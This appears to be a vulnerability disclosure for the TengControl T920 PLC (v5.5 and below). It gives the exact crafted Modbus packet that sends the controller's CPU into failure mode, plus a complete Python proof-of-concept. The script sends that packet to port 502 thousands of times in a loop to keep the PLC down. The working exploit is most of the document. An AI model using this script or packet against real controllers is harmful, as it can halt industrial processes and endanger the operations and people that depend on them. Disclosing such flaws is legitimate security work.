# T920_PLC_DOS

[bug]()

# TENGCONTROL TECHNOLOGY

## Edition :

TENGCONTROL TECHNOLOGY T920 PLC v5.5 and below

## Location

abnormal dataï¼š"\x00\x02\x00\x00\x00\x06\x01\x05\xbd\x11\xff\x00"

### Harm

Allows attackers to exploit this vulnerability to initiate a persistent denial of service attack on the controller remotely.

### Cause the cause

By constructing the above specific network data packet, the T-920 CPU can be denied service when communicating, and the CPU enters the failure mode and can be automatically restarted after a period of time. The vulnerability is exploited by an attacker to remotely initiate a persistent denial of service attack on the controller, affecting the normal operation of the controller.

When the T-920 writes a single coil, when the address is 0xbd11, the CPU is rejected.

(1)At first, we can see the communication is normal

![](https://i.loli.net/2019/03/20/5c91a333ad3e0.jpg)
(2)Then execute the script

![](https://i.loli.net/2019/03/20/5c91a3aa14bf3.jpg)

It can be observed that the PLC has refused service, the network has been pinged, and after a few seconds, the PLC CPU restarts; once the CPU restarts, the attacker uses the vulnerability to continuously send data to make the PLC continuously refuse service, which affects the normal operation of the PLC.

## poc

```
#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import argparse
import socket
import os
import time
from random import randint

TIMEOUT = 2
PORT = 502
ip = "192.168.1.99"

def get_args():
   
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', metavar='<ip addr>', help='IP address',required=True)
    args = parser.parse_args()
    return args

payload_List = [
"\x00\x02\x00\x00\x00\x06\x01\x05\xbd\x11\xff\x00"
]

# Send payload to the PLC and return the response
def connection_plc(ip, payload_List, t_sleep=0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, PORT))
	print "connect success====\n" 

	for payload in payload_List:
	    s.send(payload)
	    time.sleep(0.005)

	print "send success===\n" 
        # Silly check. Enough for the Poc
    except Exception as e:
        print "[-] Something was wrong with %s:%d. Exception: %s" % (ip, PORT, e) 
        #sys.exit(1)

    s.close()
    time.sleep(t_sleep)
    return 


def main():
	for i in range(10000):
		time.sleep(0.1)
    #args = get_args()
		connection_plc(ip, payload_List)

if __name__ == '__main__':
    main()
```